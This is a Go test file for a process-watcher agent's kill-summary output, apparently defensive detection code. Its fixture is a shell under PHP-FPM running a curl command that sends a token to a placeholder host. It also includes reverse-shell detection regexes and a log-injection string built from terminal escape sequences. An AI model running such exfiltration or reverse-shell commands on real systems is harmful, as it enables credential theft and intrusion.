package response

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/Neo23x0/process-watcher/internal/clock"
	"github.com/Neo23x0/process-watcher/internal/event"
	"github.com/Neo23x0/process-watcher/internal/killrule"
)

func strp(s string) *string { return &s }

// shellKillAction is the shape of a real kill: a shell below a PHP-FPM worker below the master.
func shellKillAction() *Action {
	return &Action{
		ExecIndex: 1,
		Process:   &event.Process{PID: 475399, UID: 48, Image: strp("bash"), Argv: []string{"sh", "-c", "--", "curl https://example.invalid/?token=hunter2"}},
		Parent:    &event.Parent{PID: 460979, Image: strp("php-fpm")},
		Root:      &event.Root{PID: 460977, Image: strp("php-fpm")},
		Hits: []killrule.Hit{
			{Ref: "kill.regex[0]", Type: killrule.TypeRegex, Pattern: `^(sh|dash|bash|zsh|ksh|ash)$`, Field: "image", ArgIndex: -1},
			{Ref: "kill.regex[0]", Type: killrule.TypeRegex, Pattern: `^(sh|dash|bash|zsh|ksh|ash)$`, Field: "argv", ArgIndex: 0},
			{Ref: "kill.regex[5]", Type: killrule.TypeRegex, Pattern: `/dev/(tcp|udp)/[^ /]+/[0-9]{2,5}`, Field: "argv", ArgIndex: 3},
		},
	}
}

func TestSummaryNamesTheTargetWhoStartedItAndTheRules(t *testing.T) {
	got := killSummary(shellKillAction(), Result{Outcome: event.OutcomeSignalSent})
	want := `SIGKILL sent to bash (pid 475399, exec 1, uid 48), started by php-fpm (pid 460979) below php-fpm (pid 460977); ` +
		`matched kill.regex[0] "^(sh|dash|bash|zsh|ksh|ash)$" in image, argv[0]; kill.regex[5] "/dev/(tcp|udp)/[^ /]+/[0-9]{2,5}" in argv[3]`
	if got != want {
		t.Errorf("summary\n got: %s\nwant: %s", got, want)
	}
	if strings.Contains(got, "hunter2") || strings.Contains(got, "curl") {
		t.Errorf("the summary must hold no arguments: %s", got)
	}
}

func TestSummaryLeadSaysWhatHappened(t *testing.T) {
	cases := []struct {
		name   string
		dryRun bool
		r      Result
		lead   string
	}{
		{"requested live", false, Result{Outcome: event.OutcomePending}, "SIGKILL requested for bash"},
		{"requested dry", true, Result{Outcome: event.OutcomePending}, "dry run, would kill bash"},
		{"dry run", true, Result{Outcome: event.OutcomeDryRun}, "dry run, no signal sent, would have killed bash"},
		{"signal sent", false, Result{Outcome: event.OutcomeSignalSent}, "SIGKILL sent to bash"},
		{"already exited", false, Result{Outcome: event.OutcomeAlreadyExited}, "no signal sent, it had already exited: bash"},
		{"permission", false, Result{Outcome: event.OutcomePermissionDenied}, "SIGKILL refused (permission denied) for bash"},
		{"error", false, Result{Outcome: event.OutcomeError}, "SIGKILL failed for bash"},
		{"skipped with reason", false, Result{Outcome: event.OutcomeSkipped, Reason: event.SkipMatchNoLongerVerif}, "not killed, skipped (match_no_longer_verified): bash"},
		{"skipped without reason", false, Result{Outcome: event.OutcomeSkipped}, "not killed, skipped: bash"},
	}
	for _, c := range cases {
		a := shellKillAction()
		a.DryRun = c.dryRun
		if got := killSummary(a, c.r); !strings.HasPrefix(got, c.lead+" (pid 475399") {
			t.Errorf("%s: %q does not start with %q", c.name, got, c.lead)
		}
	}
}

func TestSummaryWhenTheParentIsTheRootOrPartsAreMissing(t *testing.T) {
	a := shellKillAction()
	a.Parent = &event.Parent{PID: 460977, Image: strp("php-fpm")}
	if got := killSummary(a, Result{Outcome: event.OutcomeSignalSent}); !strings.Contains(got, "), started by php-fpm (pid 460977); matched") {
		t.Errorf("a child of the root names the root once: %s", got)
	}

	// Nothing may panic when the audit data is incomplete.
	bare := &Action{Hits: nil}
	got := killSummary(bare, Result{Outcome: event.OutcomeDryRun})
	if got != "dry run, no signal sent, would have killed an unknown process; matched no rule" {
		t.Errorf("bare action: %q", got)
	}
	noImage := shellKillAction()
	noImage.Process.Image, noImage.Parent, noImage.Root = nil, nil, &event.Root{PID: 1}
	if got := killSummary(noImage, Result{Outcome: event.OutcomeSignalSent}); !strings.Contains(got, "an unknown program (pid 475399") ||
		!strings.Contains(got, "started by an unknown program (pid 1)") {
		t.Errorf("missing images: %s", got)
	}
}

func TestSummaryKeepsLongRuleListsAndPatternsShort(t *testing.T) {
	a := shellKillAction()
	a.Hits = nil
	for i := 0; i < 6; i++ {
		a.Hits = append(a.Hits, killrule.Hit{Ref: "kill.strings[" + string(rune('0'+i)) + "]", Type: killrule.TypeString, Pattern: "x", Field: "image", ArgIndex: -1})
	}
	got := killSummary(a, Result{Outcome: event.OutcomeSignalSent})
	if !strings.HasSuffix(got, `kill.strings[3] "x" in image; and 2 more rules`) {
		t.Errorf("rule list: %s", got)
	}
	a.Hits = a.Hits[:5]
	if got = killSummary(a, Result{Outcome: event.OutcomeSignalSent}); !strings.HasSuffix(got, "; and 1 more rule") {
		t.Errorf("one rule more must not read \"1 more rules\": %s", got)
	}
	a.Hits = a.Hits[:4]
	if got = killSummary(a, Result{Outcome: event.OutcomeSignalSent}); strings.Contains(got, "more rule") {
		t.Errorf("exactly four rules need no suffix: %s", got)
	}

	long := strings.Repeat("a", 200)
	a.Hits = []killrule.Hit{{Ref: "kill.regex[1]", Type: killrule.TypeRegex, Pattern: long, Field: "argv", ArgIndex: 2}}
	got = killSummary(a, Result{Outcome: event.OutcomeSignalSent})
	if !strings.Contains(got, `"`+strings.Repeat("a", 80)+`..." in argv[2]`) || strings.Contains(got, strings.Repeat("a", 81)) {
		t.Errorf("a long pattern is cut at 80 characters: %s", got)
	}

	a.Hits = []killrule.Hit{{Ref: "kill.regex[2]", Type: killrule.TypeRegex, Pattern: `exec\s+[0-9]+<>/dev/(tcp|udp)/`, Field: "argv", ArgIndex: 1}}
	if got = killSummary(a, Result{Outcome: event.OutcomeSignalSent}); !strings.Contains(got, `"exec\s+[0-9]+<>/dev/(tcp|udp)/"`) {
		t.Errorf("a pattern must read as written, backslashes included: %s", got)
	}
}

func TestSummaryCannotBeUsedToForgeLogLinesOrMoveTheCursor(t *testing.T) {
	evil := "a\n\x1b[2K\x1b]0;pwned\x07\u202e\u200b\x7f\u0085 2026-10-20T21:09:50Z  => SIGKILL sent to nothing"
	a := shellKillAction()
	a.Process.Image = &evil
	a.Parent.Image = &evil
	a.Root.Image = &evil
	a.Hits = []killrule.Hit{{Ref: "kill.regex[0]", Type: killrule.TypeRegex, Pattern: "x\ny", Field: "image", ArgIndex: -1}}
	got := killSummary(a, Result{Outcome: event.OutcomeSignalSent})
	for _, r := range got {
		if r < 0x20 || r == 0x7f || (r >= 0x80 && r < 0xa0) || r == 0x202e || r == 0x200b {
			t.Fatalf("control or format character %U in the summary: %q", r, got)
		}
	}
	if !strings.Contains(got, `a\u000a\u001b[2K\u001b]0;pwned\u0007\u202e\u200b\u007f\u0085 2026-10-20T21:09:50Z`) {
		t.Errorf("the characters must stay visible as escapes: %q", got)
	}
	if !strings.Contains(got, `"x\u000ay"`) {
		t.Errorf("a pattern is cleaned as well: %q", got)
	}

	// An image name of the longest possible length keeps the sentence short; process.image has the whole name.
	long := strings.Repeat("\x01", 255)
	a.Process.Image, a.Parent.Image, a.Root.Image = &long, &long, &long
	if got = killSummary(a, Result{Outcome: event.OutcomeSignalSent}); len(got) > 2048 {
		t.Errorf("worst case summary of %d bytes", len(got))
	}
	plain := strings.Repeat("n", 255)
	a.Process.Image = &plain
	if got = killSummary(a, Result{Outcome: event.OutcomeSignalSent}); !strings.Contains(got, strings.Repeat("n", 64)+"... (pid") {
		t.Errorf("a long image name is cut at 64 characters: %q", got)
	}
}

func TestBothKillEventsCarryTheSummary(t *testing.T) {
	fake := &clock.Fake{Boot: 5_000_000_000, Wall: time.Date(2026, 10, 20, 12, 0, 0, 0, time.UTC)}
	f := &event.Factory{AgentInstanceID: "agent", Host: event.Host{Hostname: "h", BootID: "b"}, Clock: fake}
	for _, c := range []struct{ typ, outcome string }{
		{event.TypeKillRequested, event.OutcomePending},
		{event.TypeKillResult, event.OutcomeSignalSent},
	} {
		r := Result{Outcome: c.outcome}
		ev := NewKillEvent(f, shellKillAction(), c.typ, r)
		line, err := ev.MarshalLine()
		if err != nil {
			t.Fatal(err)
		}
		var back struct {
			Details struct {
				Summary string `json:"summary"`
			} `json:"details"`
		}
		if err := json.Unmarshal(line, &back); err != nil {
			t.Fatal(err)
		}
		if back.Details.Summary == "" || back.Details.Summary != killSummary(shellKillAction(), r) {
			t.Errorf("%s: summary %q", c.typ, back.Details.Summary)
		}
	}
}
